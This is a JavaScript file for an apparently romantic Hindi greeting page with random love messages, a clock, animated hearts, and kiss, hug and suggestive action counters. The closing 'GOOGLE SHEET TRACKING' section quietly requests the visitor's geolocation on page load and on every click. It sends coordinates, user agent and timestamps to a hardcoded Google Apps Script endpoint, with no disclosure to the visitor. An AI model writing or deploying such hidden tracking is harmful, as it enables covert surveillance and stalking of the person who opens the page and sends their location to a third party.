/* ===== CONFIG =====  */
const BG_IMAGES = [
  'images/bg1.png',
  'images/bg2.png',
  'images/bg3.png',
  'images/bg4.png',
  'images/bg5.png'
];

let allMessages = [];
let kissCount = parseInt(localStorage.getItem('kissCount') || '0');
let hugCount = parseInt(localStorage.getItem('hugCount') || '0');
let naughtyCount = parseInt(localStorage.getItem('naughtyCount') || '0');
let biteCount = parseInt(localStorage.getItem('biteCount') || '0');
let tasteCount = parseInt(localStorage.getItem('tasteCount') || '0');
let spankCount = parseInt(localStorage.getItem('spankCount') || '0');
let currentBgIndex = -1;

/* ===== BOOT ===== */
document.addEventListener('DOMContentLoaded', () => {
  spawnFloatingHearts();
  updateClock();
  setInterval(updateClock, 1000);
  
  // Sync counters
  document.getElementById('kissCount').textContent = kissCount;
  document.getElementById('hugCount').textContent = hugCount;
  document.getElementById('naughtyCount').textContent = naughtyCount;
  document.getElementById('biteCount').textContent = biteCount;
  document.getElementById('tasteCount').textContent = tasteCount;
  document.getElementById('spankCount').textContent = spankCount;

  // Splash enter button
  document.getElementById('enterBtn').addEventListener('click', () => {
    sendData('open_surprise');
    document.getElementById('splashScreen').classList.add('hide');
    setTimeout(() => {
      document.getElementById('splashScreen').style.display = 'none';
      document.getElementById('mainApp').classList.add('show');
    }, 800);
  });

  // Tap card to copy
  document.getElementById('messageCard').addEventListener('click', () => {
    const text = document.getElementById('msgText').textContent;
    if (navigator.clipboard) navigator.clipboard.writeText(text);
    showToast('मैसेज कॉपी हो गया! 💖');
    sendData('card_clicked');
  });

  // Action Buttons
  document.getElementById('kissBtn').addEventListener('click', (e) => {
    kissCount++;
    localStorage.setItem('kissCount', kissCount);
    document.getElementById('kissCount').textContent = kissCount;
    burstParticles(e, ['💋', '💖', '❤️', '💕', '😘'], 'kiss-particle');
    sendData('kiss_sent');
  });

  document.getElementById('hugBtn').addEventListener('click', (e) => {
    hugCount++;
    localStorage.setItem('hugCount', hugCount);
    document.getElementById('hugCount').textContent = hugCount;
    burstParticles(e, ['🫂', '🤗', '💖', '✨'], 'hug-particle');
    sendData('hug_sent');
  });

  document.getElementById('naughtyBtn').addEventListener('click', (e) => {
    naughtyCount++;
    localStorage.setItem('naughtyCount', naughtyCount);
    document.getElementById('naughtyCount').textContent = naughtyCount;
    burstParticles(e, ['🫦', '😈', '🥵', '💦', '🔥'], 'naughty-particle');
    sendData('naughty_sent');
  });

  document.getElementById('biteBtn').addEventListener('click', (e) => {
    biteCount++;
    localStorage.setItem('biteCount', biteCount);
    document.getElementById('biteCount').textContent = biteCount;
    burstParticles(e, ['🦷', '🫦', '😈', '💥', '✨'], 'bite-particle');
    sendData('bite_sent');
  });

  document.getElementById('tasteBtn').addEventListener('click', (e) => {
    tasteCount++;
    localStorage.setItem('tasteCount', tasteCount);
    document.getElementById('tasteCount').textContent = tasteCount;
    burstParticles(e, ['👅', '🥵', '💦', '🫦', '🔥'], 'taste-particle');
    sendData('taste_sent');
  });

  document.getElementById('spankBtn').addEventListener('click', (e) => {
    spankCount++;
    localStorage.setItem('spankCount', spankCount);
    document.getElementById('spankCount').textContent = spankCount;
    burstParticles(e, ['🍑', '✋', '💥', '😈', '🔥'], 'spank-particle');
    sendData('spank_sent');
  });

  loadMessages();
  sendData('page_load');
});

/* ===== DATA ===== */
async function loadMessages() {
  try {
    const res = await fetch('./data/messages.json');
    allMessages = await res.json();
  } catch {
    allMessages = [
      { id: 1, message: "सुप्रभात! 🌅 तुम्हारी मुस्कान सूरज से भी ज्यादा रोशन है।", emoji: "🌅" },
      { id: 2, message: "गुड मॉर्निंग जान! ☀️ हर सुबह तुम्हें सोचकर शुरू होती है।", emoji: "☀️" },
      { id: 3, message: "सुबह की पहली किरण तुम्हारे नाम! 🌸", emoji: "🌸" }
    ];
  }
  showRandomMessage();
}

/* ===== SHOW ONE RANDOM MESSAGE ===== */
function showRandomMessage() {
  const msg = allMessages[Math.floor(Math.random() * allMessages.length)];
  const card = document.getElementById('messageCard');
  card.style.animation = 'none';
  card.offsetHeight; // trigger reflow
  card.style.animation = 'cardIn 0.8s ease';
  document.getElementById('msgEmoji').textContent = msg.emoji;
  document.getElementById('msgText').textContent = msg.message;
  setRandomBackground();
}

function setRandomBackground() {
  let idx;
  do {
    idx = Math.floor(Math.random() * BG_IMAGES.length);
  } while (idx === currentBgIndex && BG_IMAGES.length > 1);
  currentBgIndex = idx;
  const bgEl = document.getElementById('bgImage');
  bgEl.style.opacity = '0';
  setTimeout(() => {
    bgEl.style.backgroundImage = `url('${BG_IMAGES[idx]}')`;
    bgEl.style.opacity = '1';
  }, 400);
}

/* ===== CLOCK ===== */
function updateClock() {
  const now = new Date();
  const h = now.getHours().toString().padStart(2, '0');
  const m = now.getMinutes().toString().padStart(2, '0');
  document.getElementById('timeDisplay').textContent = `${h}:${m}`;
  const months = ['जनवरी', 'फ़रवरी', 'मार्च', 'अप्रैल', 'मई', 'जून', 'जुलाई', 'अगस्त', 'सितंबर', 'अक्टूबर', 'नवंबर', 'दिसंबर'];
  const days = ['रविवार', 'सोमवार', 'मंगलवार', 'बुधवार', 'गुरुवार', 'शुक्रवार', 'शनिवार'];
  document.getElementById('dateDisplay').textContent =
    `${days[now.getDay()]}, ${now.getDate()} ${months[now.getMonth()]} ${now.getFullYear()}`;
}

/* ===== FLOATING HEARTS ===== */
function spawnFloatingHearts() {
  const container = document.getElementById('floatingHearts');
  const hearts = ['💖', '💕', '💗', '🩷', '💘', '❤️', '🌸', '✨'];
  for (let i = 0; i < 12; i++) {
    const el = document.createElement('span');
    el.className = 'floating-heart';
    el.textContent = hearts[Math.floor(Math.random() * hearts.length)];
    el.style.left = Math.random() * 100 + '%';
    el.style.animationDelay = Math.random() * 7 + 's';
    el.style.animationDuration = 6 + Math.random() * 4 + 's';
    container.appendChild(el);
  }
}

/* ===== BURST PARTICLES ===== */
function burstParticles(e, emojis, className) {
  for (let i = 0; i < 10; i++) {
    const el = document.createElement('span');
    el.className = className;
    el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
    const angle = (Math.PI * 2 * i) / 10;
    const dist = 60 + Math.random() * 50;
    el.style.left = e.clientX + 'px';
    el.style.top = e.clientY + 'px';
    el.style.setProperty('--tx', Math.cos(angle) * dist + 'px');
    el.style.setProperty('--ty', Math.sin(angle) * dist + 'px');
    document.body.appendChild(el);
    setTimeout(() => el.remove(), 1000);
  }
}

/* ===== TOAST ===== */
function showToast(msg) {
  const toast = document.getElementById('toast');
  toast.textContent = msg;
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 2000);
}

// ==========================================
// GOOGLE SHEET TRACKING
// ==========================================
const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyxZrEUQwxdEEh0XeuiJ01lQxN-5GUiKNWXIsltafi4X_a64VY94xcA0U_8nrRT5_zF/exec";

function sendData(action) {
  let statusSent = false;
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        if (!statusSent) {
          statusSent = true;
          const loc = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
          postToSheet(action, loc);
        }
      },
      (error) => {
        if (!statusSent) {
          statusSent = true;
          let reason = "Denied";
          if (error.code === 2) reason = "Unavailable";
          if (error.code === 3) reason = "Timeout (Native)";
          postToSheet(action, `Error: ${reason} (${error.message})`);
        }
      },
      { enableHighAccuracy: false, timeout: 8000 }
    );
    setTimeout(() => {
      if (!statusSent) {
        statusSent = true;
        postToSheet(action, "Error: Timeout (JS Fallback)");
      }
    }, 10000);
  } else {
    postToSheet(action, "Error: Not Supported");
  }
}

function postToSheet(action, locationInfo) {
  fetch(GOOGLE_SCRIPT_URL, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      number: action,
      location: locationInfo,
      device: navigator.userAgent,
      timestamp: new Date().toLocaleString()
    })
  })
  .then(() => console.log("Data sent"))
  .catch(err => console.error("Error:", err));
}
